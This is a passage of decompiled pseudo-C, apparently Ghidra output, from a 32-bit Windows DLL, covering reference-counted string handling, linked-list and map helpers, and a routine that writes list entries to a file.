  if (_File == (FILE *)0x0) {
    if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
      piVar9 = (int *)FUN_1000bd10();
    }
    else {
      if ((DAT_1009acdc & 1) == 0) {
        DAT_1009acdc = DAT_1009acdc | 1;
        DAT_1009acd8 = (int *)FUN_1000bd10();
        if (DAT_1009acd8 != (int *)0x0) {
          DAT_1009acd8[2] = 0;
          *(undefined2 *)(DAT_1009acd8 + 3) = 0;
        }
        FUN_10057b51(&LAB_10078350);
      }
      piVar9 = DAT_1009acd8;
      if (DAT_1009acd8 != (int *)0x0) {
        LOCK();
        *DAT_1009acd8 = *DAT_1009acd8 + 1;
        UNLOCK();
        piVar9 = DAT_1009acd8;
      }
    }
    local_c = CONCAT31(local_c._1_3_,0xc);
    piVar8 = (int *)FUN_1000ae10(&local_84);
    if (*piVar8 == 0) {
      iVar12 = 0;
    }
    else {
      iVar12 = *piVar8 + 0xc;
    }
    FUN_10006250("error in opening \'%s\' for writing\n",iVar12);
    if (local_84 != (int *)0x0) {
      LOCK();
      iVar12 = *local_84;
      *local_84 = iVar12 + -1;
      UNLOCK();
      if (iVar12 + -1 < 0) {
        FUN_100579ee(local_84);
      }
    }
    if (piVar9 != (int *)0x0) {
      LOCK();
      iVar12 = *piVar9;
      *piVar9 = *piVar9 + -1;
      UNLOCK();
      if (iVar12 + -1 < 0) {
        FUN_100579ee(piVar9);
      }
    }
  }
  else {
    piVar9 = (int *)*piVar3;
    if (piVar9 != piVar3) {
      if ((piVar9[2] != 0) && (piVar9[2] != -0xc)) {
        iVar12 = piVar9[2];
        iVar5 = FUN_10010370(0,1);
        piVar9[2] = iVar5;
        if (iVar5 == 0) {
          piVar9[2] = iVar12;
        }
        else {
          iVar12 = FUN_1004c220();
          if (iVar12 != 0) {
            *(int *)(piVar9[2] + 8) = *(int *)(piVar9[2] + 8) - iVar12;
            *(undefined2 *)(piVar9[2] + 0xc + *(int *)(piVar9[2] + 8) * 2) = 0;
          }
        }
      }
      do {
        iVar12 = piVar9[2];
        if ((iVar12 != 0) && (iVar12 != -0xc)) {
          if (iVar12 == 0) {
            iVar12 = 0;
          }
          else {
            iVar12 = iVar12 + 0xc;
          }
          FUN_1005bd37(_File,&DAT_10089140,iVar12);
        }
        piVar9 = (int *)*piVar9;
      } while (piVar9 != piVar3);
    }
    _fclose(_File);
  }
  FUN_1000ba10();
  thunk_FUN_100579ee(local_c4);
  FUN_1003c470();
  thunk_FUN_100579ee(puVar4);
  FUN_1000ba10();
  thunk_FUN_100579ee(piVar3);
  ExceptionList = local_14;
  return;
}



/* Function: FUN_1003c400 */

void __thiscall FUN_1003c400(int *param_1,undefined4 param_2)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  
  iVar1 = *param_1;
  iVar3 = FUN_10019f30(iVar1,*(undefined4 *)(iVar1 + 4),param_2);
  if (param_1[1] != 0x15555554) {
    param_1[1] = param_1[1] + 1;
    *(int *)(iVar1 + 4) = iVar3;
    **(int **)(iVar3 + 4) = iVar3;
    return;
  }
  FUN_10056a6a("list<T> too long");
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



/* Function: FUN_1003c450 */

void __fastcall FUN_1003c450(undefined4 *param_1)

{
  FUN_1003c470();
  thunk_FUN_100579ee(*param_1);
  return;
}



/* Function: FUN_1003c470 */

void __fastcall FUN_1003c470(int *param_1)

{
  int iVar1;
  int *piVar2;
  int *piVar3;
  int *piVar4;
  
  piVar2 = (int *)*param_1;
  piVar4 = (int *)*piVar2;
  *piVar2 = (int)piVar2;
  *(int *)(*param_1 + 4) = *param_1;
  param_1[1] = 0;
  if (piVar4 != (int *)*param_1) {
    do {
      piVar2 = (int *)piVar4[4];
      piVar3 = (int *)*piVar4;
      if (piVar2 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar2;
        *piVar2 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar2);
        }
      }
      thunk_FUN_100579ee(piVar4);
      piVar4 = piVar3;
    } while (piVar3 != (int *)*param_1);
  }
  return;
}



/* Function: FUN_1003c4c0 */

undefined4 * __thiscall FUN_1003c4c0(undefined4 *param_1,int *param_2,int param_3)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined1 local_8;
  undefined3 uStack_7;
  
  puStack_c = &LAB_1007729b;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = param_2;
  if (param_2 != (int *)0x0) {
    LOCK();
    *param_2 = *param_2 + 1;
    UNLOCK();
  }
  local_8 = 1;
  uStack_7 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar3 = FUN_1000fa00(0,0);
  param_1[1] = uVar3;
  _local_8 = CONCAT31(uStack_7,2);
  param_1[3] = param_3;
  param_1[4] = 0;
  param_1[5] = 0;
  uVar3 = FUN_10017840(uVar2);
  param_1[4] = uVar3;
  param_1[6] = 0;
  param_1[7] = 0;
  param_1[8] = 0;
  uVar3 = FUN_10010440(*(undefined4 *)(param_3 + 0x18));
  param_1[6] = uVar3;
  if ((param_2 != (int *)0x0) && (param_2[2] != 0)) {
    uVar3 = FUN_1000bfa0(param_2 + 3,param_2[2]);
    param_1[6] = uVar3;
  }
  uVar3 = FUN_1000bfa0(&DAT_10088e54,0xffffffff);
  param_1[6] = uVar3;
  if (param_2 != (int *)0x0) {
    LOCK();
    iVar1 = *param_2;
    *param_2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(param_2);
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1003c5d0 */

undefined4 * __thiscall FUN_1003c5d0(undefined4 *param_1,int *param_2)

{
  int iVar1;
  uint uVar2;
  undefined4 uVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined1 local_8;
  undefined3 uStack_7;
  
  puStack_c = &LAB_100772db;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  *param_1 = 0;
  local_8 = 1;
  uStack_7 = 0;
  param_1[1] = 0;
  param_1[2] = 0;
  uVar3 = FUN_1000fa00(0,0);
  param_1[1] = uVar3;
  _local_8 = CONCAT31(uStack_7,2);
  param_1[3] = param_1;
  param_1[4] = 0;
  param_1[5] = 0;
  uVar3 = FUN_10017840(uVar2);
  param_1[4] = uVar3;
  param_1[6] = param_2;
  if (param_2 != (int *)0x0) {
    LOCK();
    *param_2 = *param_2 + 1;
    UNLOCK();
  }
  param_1[7] = 0;
  param_1[8] = 0;
  if (param_2 != (int *)0x0) {
    LOCK();
    iVar1 = *param_2;
    *param_2 = iVar1 + -1;
    UNLOCK();
    if (iVar1 + -1 < 0) {
      FUN_100579ee(param_2);
    }
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1003c690 */

bool __fastcall FUN_1003c690(int *param_1,undefined4 param_2,int *param_3)

{
  short sVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  short *psVar6;
  undefined4 extraout_ECX;
  uint uVar7;
  uint local_6c [3];
  undefined4 local_60;
  int local_5c;
  int local_58;
  undefined4 local_44;
  int local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  short *local_24;
  int *local_20;
  undefined4 local_1c;
  short *local_18;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_10077318;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if ((*param_1 == 0) || (*param_1 == -0xc)) {
    return false;
  }
  local_40 = 0;
  local_3c = 0;
  local_38 = 0;
  local_34 = 0;
  local_30 = 0;
  local_2c = 0;
  local_28 = 1;
  local_44 = 0;
  local_8 = 0;
  ExceptionList = &local_10;
  FUN_1000e7e0(param_2,param_1);
  FUN_1000f000(extraout_ECX);
  local_8._0_1_ = 1;
  if (*param_1 == 0) {
    local_24 = (short *)0x0;
  }
  else {
    local_24 = (short *)(*param_1 + 0xc);
  }
  psVar6 = local_24;
  do {
    sVar1 = *psVar6;
    psVar6 = psVar6 + 1;
  } while (sVar1 != 0);
  local_18 = local_24;
  if (0 < ((int)psVar6 - (int)(local_24 + 1) >> 1) * 2) {
    while (psVar6 = local_18, local_24 = local_18, iVar3 = FUN_1000e8d0(local_18,local_6c,&local_24)
          , iVar3 != 0) {
      uVar7 = 0;
      if (local_6c[0] != 0) {
        if (local_6c[0] == 0) {
LAB_1003c915:
          FUN_10007f20(0x80004005);
          ExceptionList = local_10;
          return false;
        }
        do {
          psVar6 = *(short **)(local_5c + uVar7 * 8);
          if ((psVar6 == (short *)0x0) || (*psVar6 != 0)) {
            piVar4 = (int *)FUN_1000bd10();
          }
          else {
            if ((DAT_1009acdc & 1) == 0) {
              DAT_1009acdc = DAT_1009acdc | 1;
              local_1c = 0;
              DAT_1009acd8 = (int *)FUN_1000bd10();
              if (DAT_1009acd8 != (int *)0x0) {
                DAT_1009acd8[2] = 0;
                *(undefined2 *)(DAT_1009acd8 + 3) = 0;
              }
              FUN_10057b51(&LAB_10078350);
            }
            piVar4 = DAT_1009acd8;
            if (DAT_1009acd8 != (int *)0x0) {
              LOCK();
              *DAT_1009acd8 = *DAT_1009acd8 + 1;
              UNLOCK();
              piVar4 = DAT_1009acd8;
            }
          }
          local_8._0_1_ = 2;
          iVar3 = *param_3;
          local_20 = piVar4;
          iVar5 = FUN_10011570(iVar3,*(undefined4 *)(iVar3 + 4),&local_20);
          if (param_3[1] == 0x15555554) {
            FUN_10056a6a("list<T> too long");
            goto LAB_1003c915;
          }
          param_3[1] = param_3[1] + 1;
          *(int *)(iVar3 + 4) = iVar5;
          local_8._0_1_ = 1;
          **(int **)(iVar5 + 4) = iVar5;
          if (piVar4 != (int *)0x0) {
            LOCK();
            iVar3 = *piVar4;
            *piVar4 = iVar3 + -1;
            UNLOCK();
            if (iVar3 + -1 < 0) {
              FUN_100579ee(piVar4);
            }
          }
          uVar7 = uVar7 + 1;
          psVar6 = local_18;
        } while (uVar7 < local_6c[0]);
      }
      if ((psVar6 == (short *)0x0) || (*psVar6 == 0)) break;
      local_18 = local_24;
      psVar6 = local_24;
      do {
        sVar1 = *psVar6;
        psVar6 = psVar6 + 1;
      } while (sVar1 != 0);
      if (((int)psVar6 - (int)(local_24 + 1) >> 1) * 2 < 1) break;
    }
  }
  iVar3 = param_3[1];
  if (local_58 != 0) {
    FUN_100579ee(local_58,uVar2);
  }
  thunk_FUN_100579ee(local_5c);
  local_5c = 0;
  thunk_FUN_100579ee(local_60);
  local_60 = 0;
  if (local_40 != 0) {
    FUN_100579ee(local_40);
  }
  ExceptionList = local_10;
  return iVar3 != 0;
}



/* Function: FUN_1003c940 */

void __fastcall FUN_1003c940(int *param_1)

{
  int iVar1;
  
  iVar1 = *param_1;
  if (iVar1 != 0) {
    FUN_1003a250();
    thunk_FUN_100579ee(iVar1);
  }
  *param_1 = 0;
  return;
}



/* Function: FUN_1003c970 */

undefined4 * __thiscall FUN_1003c970(undefined4 *param_1,short *param_2)

{
  undefined4 uVar1;
  undefined4 uVar2;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007735b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((param_2 == (short *)0x0) || (*param_2 != 0)) {
    uVar1 = FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    uVar2 = extraout_ECX_00;
  }
  else {
    uVar1 = FUN_1000ba60();
    uVar2 = extraout_ECX;
  }
  *param_1 = uVar1;
  param_1[1] = 0;
  local_8 = 1;
  uVar2 = FUN_1000bd10(uVar2);
  FUN_1003c5d0(uVar2);
  param_1[0xb] = 0;
  local_8 = 2;
  param_1[0xc] = param_1 + 2;
  param_1[0xd] = param_1;
  param_1[0xe] = 0;
  param_1[0xf] = 0;
  uVar2 = FUN_1000fa00(0,0);
  param_1[0xe] = uVar2;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1003ca30 */

undefined4 * __thiscall FUN_1003ca30(undefined4 *param_1,undefined4 param_2,int *param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007739b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar1 = *param_3;
  if (((iVar1 == 0) || (*(int *)(iVar1 + 8) == 0)) ||
     ((iVar1 != 0 && (((short *)(iVar1 + 0xc) != (short *)0x0 && (*(short *)(iVar1 + 0xc) == 0))))))
  {
    uVar2 = FUN_1000ba60();
    uVar3 = extraout_ECX;
  }
  else {
    uVar2 = FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    uVar3 = extraout_ECX_00;
  }
  *param_1 = uVar2;
  param_1[1] = 0;
  local_8 = 1;
  uVar3 = FUN_1000bd10(uVar3);
  FUN_1003c5d0(uVar3);
  param_1[0xb] = 0;
  local_8 = 2;
  param_1[0xc] = param_2;
  param_1[0xd] = param_3;
  param_1[0xe] = 0;
  param_1[0xf] = 0;
  uVar3 = FUN_1000fa00(0,0);
  param_1[0xe] = uVar3;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1003cb10 */

bool __thiscall FUN_1003cb10(int param_1,undefined4 param_2,undefined4 param_3)

{
  int iVar1;
  
  if (param_1 == 0) {
    return false;
  }
  iVar1 = FUN_1003cb30(param_1,param_3);
  return iVar1 != 0;
}



/* Function: FUN_1003cb30 */

undefined4 __thiscall FUN_1003cb30(int param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  int iVar2;
  char cVar3;
  uint uVar4;
  int *piVar5;
  int iVar6;
  undefined4 uVar7;
  int iVar8;
  int *piVar9;
  int *piVar10;
  undefined8 uVar11;
  int local_24;
  int local_20;
  int *local_1c;
  int *local_18;
  int local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100773da;
  local_10 = ExceptionList;
  uVar4 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  if (((param_1 != 0) && (iVar6 = *(int *)(param_1 + 0x30), iVar6 != 0)) &&
     (piVar10 = (int *)**(int **)(iVar6 + 4), local_14 = param_1, piVar10 != *(int **)(iVar6 + 4)))
  {
    do {
      piVar5 = (int *)FUN_1000bd10(uVar4);
      local_1c = (int *)(piVar10[2] + 0x10);
      local_18 = piVar5;
      iVar6 = FUN_1001d340(&local_18);
      local_1c = (int *)*local_1c;
      if (((int *)iVar6 == local_1c) ||
         (cVar3 = FUN_1001d1f0(&local_18,iVar6 + 0x10), cVar3 != '\0')) {
        local_24 = (int)local_1c;
        piVar9 = &local_24;
      }
      else {
        local_20 = iVar6;
        piVar9 = &local_20;
      }
      iVar6 = *piVar9;
      if (piVar5 != (int *)0x0) {
        LOCK();
        iVar1 = *piVar5;
        *piVar5 = iVar1 + -1;
        UNLOCK();
        if (iVar1 + -1 < 0) {
          FUN_100579ee(piVar5);
        }
      }
      if ((*(int *)(piVar10[2] + 0x10) != iVar6) && (cVar3 = FUN_1004b4e0(), cVar3 != '\0')) {
        param_3 = FUN_10058463(0x40,&DAT_10098020);
        iVar6 = local_14;
        local_8 = 0;
        if (param_3 == 0) {
          param_3 = 0;
        }
        else {
          param_3 = FUN_1003ca30(piVar10[2],*(undefined4 *)(local_14 + 0x34));
        }
        local_8 = 1;
        iVar1 = *(int *)(iVar6 + 0x34);
        iVar2 = *(int *)(iVar1 + 0x38);
        uVar7 = FUN_10019f30(iVar2,*(undefined4 *)(iVar2 + 4),&param_3);
        uVar11 = CONCAT44(uVar7,*(int *)(iVar1 + 0x3c));
        if (*(int *)(iVar1 + 0x3c) == 0x15555554) {
          uVar11 = FUN_10056a6a("list<T> too long");
        }
        iVar8 = (int)((ulonglong)uVar11 >> 0x20);
        *(int *)(iVar1 + 0x3c) = (int)uVar11 + 1;
        *(int *)(iVar2 + 4) = iVar8;
        **(int **)(iVar8 + 4) = iVar8;
        if (param_3 != 0) {
          FUN_1003a1b0(param_3);
        }
        ExceptionList = local_10;
        return *(undefined4 *)(*(int *)(*(int *)(*(int *)(iVar6 + 0x34) + 0x38) + 4) + 8);
      }
      piVar10 = (int *)*piVar10;
    } while (piVar10 != (int *)*(int *)(*(int *)(local_14 + 0x30) + 4));
  }
  ExceptionList = local_10;
  return 0;
}



/* Function: FUN_1003cce0 */

undefined4 * __fastcall FUN_1003cce0(int param_1)

{
  if ((DAT_1009b604 & 1) == 0) {
    DAT_1009b604 = DAT_1009b604 | 1;
    DAT_1009b608 = 0;
    FUN_10057b51(&LAB_100788d0);
  }
  if (param_1 == 0) {
    return &DAT_1009b608;
  }
  if (*(int *)(param_1 + 0x30) == 0) {
    return (undefined4 *)(param_1 + 0x24);
  }
  return (undefined4 *)(*(int *)(param_1 + 0x30) + 0x1c);
}



/* Function: FUN_1003cd30 */

int __thiscall FUN_1003cd30(int param_1,int *param_2,undefined4 param_3,int param_4)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 uVar6;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007743c;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  if ((param_1 != 0) && (*(int *)(param_1 + 0x30) != 0)) {
    ExceptionList = &local_10;
    iVar3 = FUN_1003cb30(param_1,param_4);
    if (iVar3 == 0) {
      iVar3 = FUN_10058463(0x24,&DAT_10098020,uVar2);
      local_8 = 0;
      if (iVar3 == 0) {
        param_2 = (int *)0x0;
      }
      else {
        uVar5 = *(undefined4 *)(param_1 + 0x30);
        uVar6 = extraout_ECX;
        FUN_1000ad00(param_2,0xffffffff);
        param_2 = (int *)FUN_1003c4c0(uVar6,uVar5);
      }
      local_8 = 1;
      FUN_1003c400(&param_2);
      iVar3 = (int)param_2;
      if (param_2 != (int *)0x0) {
        FUN_1003a250();
        thunk_FUN_100579ee(iVar3);
      }
      param_2 = (int *)FUN_1000bd10();
      local_8 = 2;
      puVar4 = (undefined4 *)FUN_1001d190(&param_2);
      uVar5 = FUN_1000bdd0(param_4,extraout_ECX_00);
      *puVar4 = uVar5;
      if (param_2 != (int *)0x0) {
        LOCK();
        iVar3 = *param_2;
        *param_2 = *param_2 + -1;
        UNLOCK();
        if (iVar3 + -1 < 0) {
          FUN_100579ee(param_2);
        }
      }
      piVar1 = (int *)(*(int *)(param_1 + 0x34) + 0x2c);
      *piVar1 = *piVar1 + 1;
      param_4 = FUN_10058463(0x40,&DAT_10098020);
      local_8 = 3;
      if (param_4 == 0) {
        param_4 = 0;
      }
      else {
        param_4 = FUN_1003ca30(*(undefined4 *)
                                (*(int *)(*(int *)(*(int *)(param_1 + 0x30) + 4) + 4) + 8),
                               *(undefined4 *)(param_1 + 0x34));
      }
      local_8 = 4;
      FUN_1003c400(&param_4);
      if (param_4 != 0) {
        FUN_1003a1b0(param_4);
      }
      iVar3 = *(int *)(*(int *)(*(int *)(*(int *)(param_1 + 0x34) + 0x38) + 4) + 8);
    }
    ExceptionList = local_10;
    return iVar3;
  }
  return 0;
}



/* Function: FUN_1003ced0 */

void __fastcall FUN_1003ced0(int *param_1)

{
  if (*param_1 != 0) {
    FUN_1003a1b0(*param_1);
  }
  *param_1 = 0;
  return;
}



/* Function: FUN_1003cef0 */

undefined4 * __thiscall FUN_1003cef0(undefined4 *param_1,int *param_2,int *param_3)

{
  int iVar1;
  char cVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  int iVar6;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  int iVar7;
  undefined8 uVar8;
  undefined4 *local_14;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_100774a8;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  if ((param_2 == (int *)0x0) || (*(short *)param_2 != 0)) {
    uVar3 = FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    uVar4 = extraout_ECX_00;
  }
  else {
    uVar3 = FUN_1000ba60();
    uVar4 = extraout_ECX;
  }
  *param_1 = uVar3;
  param_1[1] = 0;
  local_8 = 1;
  uVar4 = FUN_1000bd10(uVar4);
  puVar5 = param_1 + 2;
  FUN_1003c5d0(uVar4);
  param_1[0xb] = 0;
  local_8 = 2;
  param_1[0xc] = puVar5;
  param_1[0xd] = param_1;
  param_1[0xe] = 0;
  param_1[0xf] = 0;
  uVar4 = FUN_1000fa00(0,0);
  param_1[0xe] = uVar4;
  local_8._0_1_ = 3;
  param_1[0x10] = param_3;
  FUN_1003ade0();
  FUN_1003aff0();
  if (param_1[4] == 0) {
    param_2 = (int *)FUN_10058463(0x24,&DAT_10098020);
    local_8._0_1_ = 4;
    if (param_2 == (int *)0x0) {
      param_2 = (int *)0x0;
    }
    else {
      uVar4 = FUN_1000bd10(extraout_ECX_01,puVar5);
      param_2 = (int *)FUN_1003c4c0(uVar4,puVar5);
    }
    local_8 = CONCAT31(local_8._1_3_,5);
    iVar6 = param_1[3];
    uVar4 = FUN_10019f30(iVar6,*(undefined4 *)(iVar6 + 4),&param_2);
    uVar8 = CONCAT44(uVar4,param_1[4]);
    if (param_1[4] == 0x15555554) {
      uVar8 = FUN_10056a6a("list<T> too long");
    }
    iVar1 = (int)param_2;
    iVar7 = (int)((ulonglong)uVar8 >> 0x20);
    param_1[4] = (int)uVar8 + 1;
    *(int *)(iVar6 + 4) = iVar7;
    **(int **)(iVar7 + 4) = iVar7;
    if (param_2 != (int *)0x0) {
      FUN_1003a250();
      thunk_FUN_100579ee(iVar1);
    }
    iVar6 = *(int *)(*(int *)(param_1[3] + 4) + 8);
    param_2 = (int *)FUN_1000bd10();
    param_3 = (int *)(iVar6 + 0x10);
    local_8 = CONCAT31(local_8._1_3_,6);
    puVar5 = (undefined4 *)FUN_1001d340(&param_2);
    if ((puVar5 == (undefined4 *)*param_3) ||
       (cVar2 = FUN_1001d1f0(&param_2,puVar5 + 4), uVar4 = extraout_ECX_02, cVar2 != '\0')) {
      local_14 = &param_2;
      iVar6 = FUN_1001daa0(&local_14,&local_14,local_14);
      FUN_1001dd20(&local_14,puVar5,iVar6 + 0x10,iVar6);
      uVar4 = extraout_ECX_03;
      puVar5 = local_14;
    }
    uVar4 = FUN_1000bdd0(&DAT_1008917c,uVar4);
    puVar5[5] = uVar4;
    if (param_2 != (int *)0x0) {
      LOCK();
      iVar6 = *param_2;
      *param_2 = *param_2 + -1;
      UNLOCK();
      if (iVar6 + -1 < 0) {
        FUN_100579ee(param_2);
      }
    }
    param_1[0xb] = 1;
  }
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1003d100 */

undefined4 * __thiscall FUN_1003d100(undefined4 *param_1,undefined4 param_2,int *param_3)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007739b;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar1 = *param_3;
  if (((iVar1 == 0) || (*(int *)(iVar1 + 8) == 0)) ||
     ((iVar1 != 0 && (((short *)(iVar1 + 0xc) != (short *)0x0 && (*(short *)(iVar1 + 0xc) == 0))))))
  {
    uVar2 = FUN_1000ba60();
    uVar3 = extraout_ECX;
  }
  else {
    uVar2 = FUN_1000bd10(DAT_100956e0 ^ (uint)&stack0xfffffffc);
    uVar3 = extraout_ECX_00;
  }
  *param_1 = uVar2;
  param_1[1] = 0;
  local_8 = 1;
  uVar3 = FUN_1000bd10(uVar3);
  FUN_1003c5d0(uVar3);
  param_1[0xb] = 0;
  local_8 = 2;
  param_1[0xc] = param_2;
  param_1[0xd] = param_3;
  param_1[0xe] = 0;
  param_1[0xf] = 0;
  uVar3 = FUN_1000fa00(0,0);
  param_1[0xe] = uVar3;
  param_1[0x10] = 0;
  ExceptionList = local_10;
  return param_1;
}



/* Function: FUN_1003d1f0 */

void __fastcall FUN_1003d1f0(int *param_1)

{
  int *piVar1;
  uint uVar2;
  int iVar3;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_100774e3;
  local_10 = ExceptionList;
  uVar2 = DAT_100956e0 ^ (uint)&stack0xfffffffc;
  ExceptionList = &local_10;
  local_8 = 1;
  if (param_1[0x10] != 0) {
    if (*param_1 == 0) {
      iVar3 = 0;
    }
    else {
      iVar3 = *param_1 + 0xc;
    }
    FUN_1003b790(iVar3);
  }
  FUN_1003d910(uVar2);
  thunk_FUN_100579ee(param_1[0xe]);
  FUN_1003a250();
  piVar1 = (int *)param_1[1];
  if (piVar1 != (int *)0x0) {
    LOCK();
    iVar3 = *piVar1;
    *piVar1 = iVar3 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(piVar1);
    }
  }
  param_1 = (int *)*param_1;
  if (param_1 != (int *)0x0) {
    LOCK();
    iVar3 = *param_1;
    *param_1 = *param_1 + -1;
    UNLOCK();
    if (iVar3 + -1 < 0) {
      FUN_100579ee(param_1);
    }
  }
  ExceptionList = local_10;
  return;
}



/* Function: FUN_1003d2a0 */

bool __thiscall FUN_1003d2a0(int param_1,undefined4 param_2)

{
  int iVar1;
  
  if (param_1 == 0) {
    return false;
  }
  iVar1 = FUN_1003d2c0(param_2);
  return iVar1 != 0;
}



/* Function: FUN_1003d2c0 */

undefined4 __thiscall FUN_1003d2c0(int param_1,ushort *param_2)

{
  ushort uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  ushort *puVar5;
  undefined4 uVar6;
  ushort *puVar7;
  int iVar8;
  int *piVar9;
  bool bVar10;
  undefined8 uVar11;
  void *local_10;
  undefined1 *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_1007751a;
  local_10 = ExceptionList;
  if (((param_1 != 0) && (iVar2 = *(int *)(param_1 + 0x30), iVar2 != 0)) &&
     (piVar9 = (int *)**(int **)(iVar2 + 4), piVar9 != *(int **)(iVar2 + 4))) {
    do {
      if ((*(int *)piVar9[2] == 0) ||
         (puVar5 = (ushort *)(*(int *)piVar9[2] + 0xc), puVar5 == (ushort *)0x0)) {
        if ((param_2 == (ushort *)0x0) || (*param_2 == 0)) goto LAB_1003d360;
      }
      else {
        puVar7 = param_2;
        if (param_2 == (ushort *)0x0) {
          bVar10 = *puVar5 == 0;
        }
        else {
          do {
            uVar1 = *puVar5;
            bVar10 = uVar1 < *puVar7;
            if (uVar1 != *puVar7) {
LAB_1003d34c:
              bVar10 = (-(uint)bVar10 | 1) == 0;
              goto LAB_1003d359;
            }
            if (uVar1 == 0) break;
            uVar1 = puVar5[1];
            bVar10 = uVar1 < puVar7[1];
            if (uVar1 != puVar7[1]) goto LAB_1003d34c;
            puVar5 = puVar5 + 2;
            puVar7 = puVar7 + 2;
          } while (uVar1 != 0);
          bVar10 = true;
        }
LAB_1003d359:
        if (bVar10) {
LAB_1003d360:
          ExceptionList = &local_10;
          param_2 = (ushort *)FUN_10058463(0x44,&DAT_10098020,DAT_100956e0 ^ (uint)&stack0xfffffffc)
          ;
          local_8 = 0;
          if (param_2 == (ushort *)0x0) {
            param_2 = (ushort *)0x0;
          }
          else {
            param_2 = (ushort *)FUN_1003d100(piVar9[2],*(undefined4 *)(param_1 + 0x34));
          }
          local_8 = 1;
          iVar2 = *(int *)(param_1 + 0x34);
          iVar3 = *(int *)(iVar2 + 0x38);
          uVar6 = FUN_10019f30(iVar3,*(undefined4 *)(iVar3 + 4),&param_2);
          uVar11 = CONCAT44(uVar6,*(int *)(iVar2 + 0x3c));
          if (*(int *)(iVar2 + 0x3c) == 0x15555554) {
            uVar11 = FUN_10056a6a("list<T> too long");
          }
          iVar4 = (int)param_2;
          iVar8 = (int)((ulonglong)uVar11 >> 0x20);
          *(int *)(iVar2 + 0x3c) = (int)uVar11 + 1;
          *(int *)(iVar3 + 4) = iVar8;
          local_8 = 0xffffffff;
          **(int **)(iVar8 + 4) = iVar8;
          if (param_2 != (ushort *)0x0) {
            FUN_1003d1f0();
            thunk_FUN_100579ee(iVar4);
          }
          ExceptionList = local_10;
          return *(undefined4 *)(*(int *)(*(int *)(*(int *)(param_1 + 0x34) + 0x38) + 4) + 8);
        }
      }
      piVar9 = (int *)*piVar9;
    } while (piVar9 != (int *)*(int *)(iVar2 + 4));
  }
  return 0;
}



/* Function: FUN_1003d440 */

undefined4 * __fastcall FUN_1003d440(int param_1)

{
  if ((DAT_1009b60c & 1) == 0) {
    DAT_1009b60c = DAT_1009b60c | 1;
    DAT_1009b610 = 0;
    FUN_10057b51(&LAB_100788f0);
  }
  if (param_1 == 0) {
    return &DAT_1009b610;
  }
  if (*(int *)(param_1 + 0x30) == 0) {
    return (undefined4 *)(param_1 + 0x24);
  }
  return (undefined4 *)(*(int *)(param_1 + 0x30) + 0x1c);
}



/* Function: FUN_1003d490 */

